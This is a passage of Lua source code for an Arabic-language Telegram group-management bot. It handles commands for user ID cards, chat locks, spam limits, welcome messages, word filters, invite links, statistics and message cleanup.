local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#edit',(edit_msg or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'لا يوجد'))
local new_id = new_id:gsub('#msgday',(msgsday or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#Description',(Description or 'لا يوجد'))
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, HmD.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
end
else
if DevHmD:get(DevTwix.."HmD:AllIds:Text") then
newallid = DevHmD:get(DevTwix.."HmD:AllIds:Text")
newallid = newallid:gsub('#username',(username or 'لا يوجد'))
newallid = newallid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
newallid = newallid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
newallid = newallid:gsub('#photos',(HmD.total_count_ or 'لا يوجد')) 
newallid = newallid:gsub('#game',(user_nkt or 'لا يوجد'))
newallid = newallid:gsub('#edit',(edit_msg or 'لا يوجد'))
newallid = newallid:gsub('#cont',(cont or 'لا يوجد'))
newallid = newallid:gsub('#msgs',(user_msgs or 'لا يوجد'))
newallid = newallid:gsub('#msgday',(msgsday or 'لا يوجد'))
newallid = newallid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
newallid = newallid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
newallid = newallid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
newallid = newallid:gsub('#Description',(Description or 'لا يوجد'))
else
newallid = "\n⋄︙معرفك : "..username.."\n⋄︙ايديك : "..msg.sender_user_id_.."\n⋄︙رتبتك : "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n⋄︙رسائلك : "..user_msgs.."\n⋄︙تعديلاتك : "..edit_msg.."\n⋄︙تفاعلك : "..formsgs(msguser).."\n⋄︙نقاطك : "..user_nkt.."\n"
end 
if not DevHmD:get(DevTwix.."HmD:GpIds:Text"..msg.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, newallid, 1, 'html')
else
local new_id = DevHmD:get(DevTwix.."HmD:GpIds:Text"..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
local new_id = new_id:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(HmD.total_count_ or 'لا يوجد')) 
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#edit',(edit_msg or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'لا يوجد'))
local new_id = new_id:gsub('#msgday',(msgsday or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
local new_id = new_id:gsub('#Description',(Description or 'لا يوجد'))
Dev_HmD(msg.chat_id_, msg.id_, 1, new_id, 1, 'html')  
end
end
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙عذرا الايدي معطل ', 1, 'md')
end
else
if DevHmD:get(DevTwix.."HmD:AllIds:Text") then
notpicid = DevHmD:get(DevTwix.."HmD:AllIds:Text")
notpicid = notpicid:gsub('#username',(username or 'لا يوجد'))
notpicid = notpicid:gsub('#CustomTitle',(CustomTitle or 'لا يوجد'))
notpicid = notpicid:gsub('#bio',(GetBio(msg.sender_user_id_) or 'لا يوجد'))
notpicid = notpicid:gsub('#photos',(HmD.total_count_ or 'لا يوجد')) 
notpicid = notpicid:gsub('#game',(user_nkt or 'لا يوجد'))
notpicid = notpicid:gsub('#edit',(edit_msg or 'لا يوجد'))
notpicid = notpicid:gsub('#cont',(cont or 'لا يوجد'))
notpicid = notpicid:gsub('#msgs',(user_msgs or 'لا يوجد'))
notpicid = notpicid:gsub('#msgday',(msgsday or 'لا يوجد'))
notpicid = notpicid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
notpicid = notpicid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
notpicid = notpicid:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
notpicid = notpicid:gsub('#Description',(Description or 'لا يوجد'))
else
notpicid = "\n⋄︙انت لا تملك صورة ..\n\n⋄︙معرفك : "..username.."\n⋄︙ايديك : "..msg.sender_user_id_.."\n⋄︙رتبتك : "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n⋄︙رسائلك : "..user_msgs.."\n⋄︙تعديلاتك : "..edit_msg.."\n⋄︙تفاعلك : "..formsgs(msguser).."\n⋄︙نقاطك : "..user_nkt.."\n"
end 
if not DevHmD:get(DevTwix..'HmD:Lock:Id'..msg.chat_id_) then
if not DevHmD:get(DevTwix..'HmD:Lock:Id:Photo'..msg.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, notpicid, 1, 'html')
else
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙*معرفك :"..username.."\n⋄︙ايديك : "..msg.sender_user_id_.."\n⋄︙رتبتك : "..IdRank(msg.sender_user_id_, msg.chat_id_).."\n⋄︙رسائلك : "..user_msgs.."\n⋄︙تعديلاتك : "..edit_msg.."\n⋄︙رسائلك : "..user_msgs.."\n⋄︙تفاعلك : "..formsgs(msguser).."\n⋄︙نقاطك : "..user_nkt.."\n*", 1, 'md')
end
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙عذرا الايدي معطل', 1, 'md')
end end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
getUser(msg.sender_user_id_, DevTwixTeam)
end
end 
---------------------------------------------------------------------------------------
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg) then
if text and text:match("^قفل (.*)$") and ChCheck(msg) then
local LockText = {string.match(text, "^(قفل) (.*)$")}
if LockText[2] == "التعديل" then
if not DevHmD:get(DevTwix..'HmD:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل التعديل")  
DevHmD:set(DevTwix..'HmD:Lock:EditMsgs'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙التعديل بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "التعديل الميديا" or LockText[2] == "تعديل الميديا" then
if not DevHmD:get(DevTwix..'HmD:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل تعديل الميديا")  
DevHmD:set(DevTwix..'HmD:Lock:EditMsgs'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تعديل الميديا بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفارسيه" then
if not DevHmD:get(DevTwix..'HmD:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل الفارسيه")  
DevHmD:set(DevTwix..'HmD:Lock:Farsi'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الفارسيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفشار" then
if DevHmD:get(DevTwix..'HmD:Lock:Fshar'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل الفشار")  
DevHmD:del(DevTwix..'HmD:Lock:Fshar'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الفشار بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الطائفيه" then
if DevHmD:get(DevTwix..'HmD:Lock:Taf'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل الطائفيه")  
DevHmD:del(DevTwix..'HmD:Lock:Taf'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الطائفيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الكفر" then
if DevHmD:get(DevTwix..'HmD:Lock:Kfr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل الكفر")  
DevHmD:del(DevTwix..'HmD:Lock:Kfr'..msg.chat_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الكفر بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفارسيه بالطرد" then
if not DevHmD:get(DevTwix..'HmD:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل الفارسيه بالطرد")  
DevHmD:set(DevTwix..'HmD:Lock:FarsiBan'..msg.chat_id_,true)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الفارسيه بالطرد بالفعل مقفله ', 1, 'md')
end
end
if LockText[2] == "البوتات" or LockText[2] == "البوتات بالحذف" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل البوتات بالحذف")  
DevHmD:set(DevTwix.."HmD:Lock:Bots"..msg.chat_id_,"del")  
end
if LockText[2] == "البوتات بالطرد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل البوتات بالطرد")  
DevHmD:set(DevTwix.."HmD:Lock:Bots"..msg.chat_id_,"kick")  
end
if LockText[2] == "البوتات بالتقييد" or LockText[2] == "البوتات بالتقيد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل البوتات بالتقيد")  
DevHmD:set(DevTwix.."HmD:Lock:Bots"..msg.chat_id_,"ked")  
end
if LockText[2] == "التكرار" or LockText[2] == "التكرار بالحذف" then 
DevHmD:hset(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل التكرار بالحذف")  
end
if LockText[2] == "التكرار بالطرد" then 
DevHmD:hset(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل التكرار بالطرد")  
end
if LockText[2] == "التكرار بالتقيد" or LockText[2] == "التكرار بالتقييد" then 
DevHmD:hset(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل التكرار بالتقيد")  
end
if LockText[2] == "التكرار بالكتم" then 
DevHmD:hset(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل التكرار بالكتم")  
end
if HMDicConstructor(msg) then
if LockText[2] == "التثبيت" then
if not DevHmD:get(DevTwix..'HmD:Lock:Pin'..msg.chat_id_) then
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  DevHmD:set(DevTwix.."HmD:PinnedMsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم قفل التثبيت")  
DevHmD:set(DevTwix..'HmD:Lock:Pin'..msg.chat_id_,true)
DevHmD:sadd(DevTwix.."HmD:Lock:Pinpin",msg.chat_id_) 
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙التثبيت بالفعل مقفل في المجموعه', 1, 'md')
end end end
end
end
end
---------------------------------------------------------------------------------------
if Admin(msg) then
if text and (text:match("^ضع تكرار (%d+)$") or text:match("^وضع تكرار (%d+)$")) then   
local TextSpam = text:match("ضع تكرار (%d+)$") or text:match("وضع تكرار (%d+)$")
if tonumber(TextSpam) < 2 then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙قم بتحديد عدد اكبر من 2 للتكرار', 1, 'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم وضع عدد التكرار » '..TextSpam, 1, 'md')
DevHmD:hset(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
end
end
if text and (text:match("^ضع زمن التكرار (%d+)$") or text:match("^وضع زمن التكرار (%d+)$")) then  
local TextSpam = text:match("ضع زمن التكرار (%d+)$") or text:match("وضع زمن التكرار (%d+)$")
DevHmD:hset(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم وضع زمن التكرار » '..TextSpam, 1, 'md')
end
---------------------------------------------------------------------------------------
if Manager(msg) then
if text and text == 'تفعيل الايدي بالصوره' and ChCheck(msg) then
if not DevHmD:get(DevTwix..'HmD:Lock:Id:Photo'..msg.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الايدي بالصوره بالتاكيد مفعل', 1, 'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تفعيل الايدي بالصورة",'md')
DevHmD:del(DevTwix..'HmD:Lock:Id:Photo'..msg.chat_id_)
end end
if text and text == 'تعطيل الايدي بالصوره' and ChCheck(msg) then
if DevHmD:get(DevTwix..'HmD:Lock:Id:Photo'..msg.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الايدي بالصوره بالتاكيد معطل', 1, 'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تعطيل الايدي بالصورة",'md')
DevHmD:set(DevTwix..'HmD:Lock:Id:Photo'..msg.chat_id_,true)
end end 

if text and text == 'تفعيل الايدي' and ChCheck(msg) then
if not DevHmD:get(DevTwix..'HmD:Lock:Id'..msg.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الايدي بالتاكيد مفعل ', 1, 'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تفعيل الايدي بنجاح",'md')
DevHmD:del(DevTwix..'HmD:Lock:Id'..msg.chat_id_)
end end 
if text and text == 'تعطيل الايدي' and ChCheck(msg) then
if DevHmD:get(DevTwix..'HmD:Lock:Id'..msg.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙الايدي بالتاكيد معطل ', 1, 'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تعطيل الايدي بنجاح",'md')
DevHmD:set(DevTwix..'HmD:Lock:Id'..msg.chat_id_,true)
end end
end
---------------------------------------------------------------------------------------
if text == 'ضع رابط' and ChCheck(msg) or text == 'وضع رابط' and ChCheck(msg) or text == 'ضع الرابط' and ChCheck(msg) or text == 'وضع الرابط' and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙ارسل رابط المجموعه او رابط قناة المجموعه', 1, 'md')
DevHmD:setex(DevTwix.."HmD:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
end
if text == 'انشاء رابط' and ChCheck(msg) or text == 'انشاء الرابط' and ChCheck(msg) then
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if not DevHmD:get(DevTwix.."HmD:Groups:Links"..msg.chat_id_)  then 
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
DevHmD:set(DevTwix.."HmD:Groups:Links"..msg.chat_id_,LinkGroup) 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم انشاء رابط جديد ارسل » الرابط', 1, 'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙ليست لدي صلاحية دعوة المستخدمين عبر الرابط يرجى التحقق من الصلاحيات', 1, 'md')
end
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙ارسل رابط المجموعه او رابط قناة المجموعه', 1, 'md')
DevHmD:setex(DevTwix.."HmD:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_,300,true) 
end
end
end
---------------------------------------------------------------------------------------
if Admin(msg) then
if text and text:match("^تفعيل الترحيب$") and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تفعيل الترحيب بنجاح",'md')
DevHmD:set(DevTwix.."HmD:Lock:Welcome"..msg.chat_id_,true)
end
if text and text:match("^تعطيل الترحيب$") and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تعطيل الترحيب بنجاح",'md')
DevHmD:del(DevTwix.."HmD:Lock:Welcome"..msg.chat_id_)
end
if DevHmD:get(DevTwix..'HmD:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم الغاء حفظ كليشة الترحيب', 1, 'md')
DevHmD:del(DevTwix..'HmD:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevHmD:del(DevTwix..'HmD:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
Welcomes = text:gsub('"',"") Welcomes = text:gsub("'","") Welcomes = text:gsub(",","") Welcomes = text:gsub("*","") Welcomes = text:gsub(";","") Welcomes = text:gsub("`","") Welcomes = text:gsub("{","") Welcomes = text:gsub("}","") 
DevHmD:set(DevTwix..'HmD:Groups:Welcomes'..msg.chat_id_,Welcomes)
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم حفظ كليشة الترحيب', 1, 'md')
return false   
end
if text and text:match("^ضع ترحيب$") and ChCheck(msg) or text and text:match("^وضع ترحيب$") and ChCheck(msg) or text and text:match("^اضف ترحيب$") and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙ارسل لي الترحيب الان\n⋄︙تستطيع اضافة مايلي » \n⋄︙دالة عرض الاسم » firstname\n⋄︙دالة عرض المعرف » username', 1, 'md')
DevHmD:set(DevTwix..'HmD:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^حذف الترحيب$") and ChCheck(msg) or text and text:match("^حذف ترحيب$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف الترحيب")  
DevHmD:del(DevTwix..'HmD:Groups:Welcomes'..msg.chat_id_)
end
if text and text:match("^جلب الترحيب$") and ChCheck(msg) or text and text:match("^جلب ترحيب$") and ChCheck(msg) or text and text:match("^الترحيب$") and ChCheck(msg) then
local Welcomes = DevHmD:get(DevTwix..'HmD:Groups:Welcomes'..msg.chat_id_)
if Welcomes then
Dev_HmD(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لم يتم وضع الترحيب \n⋄︙ارسل » ضع ترحيب للحفظ ', 1, 'md')
end
end
---------------------------------------------------------------------------------------
if DevHmD:get(DevTwix..'HmD:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'الغاء' then 
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم الغاء حفظ الوصف", 1, 'md')
DevHmD:del(DevTwix..'HmD:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevHmD:del(DevTwix..'HmD:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
https.request('https://api.telegram.org/bot'..TokenBot..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم تغيير وصف المجموعه', 1, 'md')
return false  
end 
if text and text:match("^ضع وصف$") and ChCheck(msg) or text and text:match("^وضع وصف$") and ChCheck(msg) then  
DevHmD:set(DevTwix..'HmD:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙ارسل لي الوصف الان', 1, 'md')
end
---------------------------------------------------------------------------------------
if text and text == "منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙ارسل لي الكلمه الان", 1, 'md') 
DevHmD:set(DevTwix.."HmD:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
return false  
end    
if DevHmD:get(DevTwix.."HmD:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
if text == 'الغاء' then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم الغاء امر المنع', 1, 'md')
DevHmD:del(DevTwix.."HmD:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم منع الكلمه » "..text, 1, 'html')
DevHmD:del(DevTwix.."HmD:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
DevHmD:hset(DevTwix..'HmD:Filters:'..msg.chat_id_, text,'newword')
return false
end
if text and text == "الغاء منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙ارسل لي الكلمه الان", 1, 'md') 
DevHmD:set(DevTwix.."HmD:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
return false  
end    
if DevHmD:get(DevTwix.."HmD:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
if text == 'الغاء' then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم الغاء امر الغاء المنع', 1, 'md')
DevHmD:del(DevTwix.."HmD:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
if not DevHmD:hget(DevTwix..'HmD:Filters:'..msg.chat_id_, text) then  
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙الكلمه » "..text.." غير ممنوعه", 1, 'html')
DevHmD:del(DevTwix.."HmD:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
else
DevHmD:hdel(DevTwix..'HmD:Filters:'..msg.chat_id_, text)
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙الكلمه » "..text.." تم الغاء منعها", 1, 'html')
DevHmD:del(DevTwix.."HmD:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
end
return false
end
---------------------------------------------------------------------------------------
if SudoBot(msg) then
if text and text == "الاحصائيات" and ChCheck(msg) or text and text == "× الاحصائيات ×" and ChCheck(msg) then
local gps = DevHmD:scard(DevTwix.."HmD:Groups") local users = DevHmD:scard(DevTwix.."HmD:Users") 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*الاحصائيات الكلية : *\n\n⋄︙عدد المشتركين :* '..users..'*\n⋄︙عدد المجموعات : *'..gps..'*', 1, 'md')
end
if text and text == "المشتركين" and ChCheck(msg) or text and text == "× المشتركين ×" and ChCheck(msg) then
local users = DevHmD:scard(DevTwix.."HmD:Users")
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙عدد المشتركين : _'..users..'_', 1, 'md')
end
end
---------------------------------------------------------------------------------------
if text and text == "المجموعات" and ChCheck(msg) or text and text == "× المجموعات ×" and ChCheck(msg) then
if not SudoBot(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمطورين فقط ', 1, 'md')
else
local gps = DevHmD:scard(DevTwix.."HmD:Groups")
local list = DevHmD:smembers(DevTwix.."HmD:Groups")
local t = '*⋄︙عدد مجموعات البوت :* ( _'..gps..'_ )\n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n*⋄︙ايديات المجموعات : ↓↓*\n'
for k,v in pairs(list) do
t = t..k.."*~ : *`"..v.."`\n" 
end
if #list == 0 then
t = '⋄︙لا يوجد مجموعات مفعله'
end
Dev_HmD(msg.chat_id_, msg.id_, 1,t, 1, 'md')
end end
---------------------------------------------------------------------------------------
if text and text:match('^تنظيف (%d+)$') or text and text:match('^مسح (%d+)$') and ChCheck(msg) then  
if not DevHmD:get(DevTwix..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
local Number = tonumber(text:match('^تنظيف (%d+)$') or text:match('^مسح (%d+)$')) 
if Number > 5000 then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لاتستطيع تنظيف اكثر من 5000 رساله', 1, 'md')
return false  
end  
local Message = msg.id_
for i=1,tonumber(Number) do
DeleteMessage(msg.chat_id_,{[0]=Message})
Message = Message - 1048576 
end
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم تنظيف *'..Number..'* من الرسائل', 1, 'md')
DevHmD:setex(DevTwix..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end 
end
if text == "تنظيف المشتركين" and SecondSudo(msg) and ChCheck(msg) or text == "× تنظيف المشتركين ×" and SecondSudo(msg) and ChCheck(msg) then 
local pv = DevHmD:smembers(DevTwix.."HmD:Users")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok" then
else
DevHmD:srem(DevTwix.."HmD:Users",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙*لا يوجد مشتركين وهميين*', 1, 'md')
else
local ok = #pv - sendok
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙عدد المشتركين الان : { '..#pv..' }\n⋄︙تم حذف : { '..sendok..' } من المشتركين\n⋄︙العدد الحقيقي الان  : ( '..ok..' ) \n', 1, 'md')
end
end
end,nil)
end,nil)
end
return false
end
---------------------------------------------------------------------------------------
if text == "تنظيف الكروبات" and SecondSudo(msg) and ChCheck(msg) or text == "تنظيف المجموعات" and SecondSudo(msg) and ChCheck(msg) or text == "× تنظيف الكروبات ×" and SecondSudo(msg) and ChCheck(msg) then 
local group = DevHmD:smembers(DevTwix.."HmD:Groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
DevHmD:srem(DevTwix.."HmD:Groups",group[i]) 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = group[i], user_id_ = DevTwix, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevHmD:srem(DevTwix.."HmD:Groups",group[i]) 
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
DevHmD:srem(DevTwix.."HmD:Groups",group[i]) 
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
DevHmD:srem(DevTwix.."HmD:Groups",group[i]) 
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙*لاتوجد مجموعات وهميه*', 1, 'md')   
else
local DevTwixgp2 = (w + q)
local DevTwixgp3 = #group - DevTwixgp2
if q == 0 then
DevTwixgp2 = ''
else
DevTwixgp2 = '\n⋄︙تم حذف : *{ '..q..' }* مجموعه من البوت'
end
if w == 0 then
DevTwixgp1 = ''
else
DevTwixgp1 = '\n⋄︙تم حذف :* { '..w..' }* مجموعه بسبب تنزيل البوت الى عضو'
end
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙عدد الكروبات الان :* { '..#group..' }*'..DevTwixgp1..DevTwixgp2..'\n⋄︙العدد الحقيقي الان  :* ( '..DevTwixgp3..' )*\n ', 1, 'md')
end end
end,nil)
end
return false
end 
end
---------------------------------------------------------------------------------------
if text and (text == "تفعيل التلقائي" or text == "تفعيل المسح التلقائي" or text == "تفعيل الحذف التلقائي") and Constructor(msg) and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تفعيل المسح التلقائي للميديا",'md')
DevHmD:set(DevTwix..'HmD:Lock:CleanNum'..msg.chat_id_,true)  
end
if text and (text == "تعطيل التلقائي" or text == "تعطيل المسح التلقائي" or text == "تعطيل الحذف التلقائي") and Constructor(msg) and ChCheck(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"✧︙تم تعطيل المسح التلقائي للميديا",'md')
DevHmD:del(DevTwix..'HmD:Lock:CleanNum'..msg.chat_id_) 
end
if text and (text:match("^تعين عدد المسح (%d+)$") or text:match("^تعيين عدد المسح (%d+)$") or text:match("^تعين عدد الحذف (%d+)$") or text:match("^تعيين عدد الحذف (%d+)$") or text:match("^عدد المسح (%d+)$")) and Constructor(msg) and ChCheck(msg) then
local Num = text:match("تعين عدد المسح (%d+)$") or text:match("تعيين عدد المسح (%d+)$") or text:match("تعين عدد الحذف (%d+)$") or text:match("تعيين عدد الحذف (%d+)$") or text:match("عدد المسح (%d+)$")
if tonumber(Num) < 10 or tonumber(Num) > 1000 then
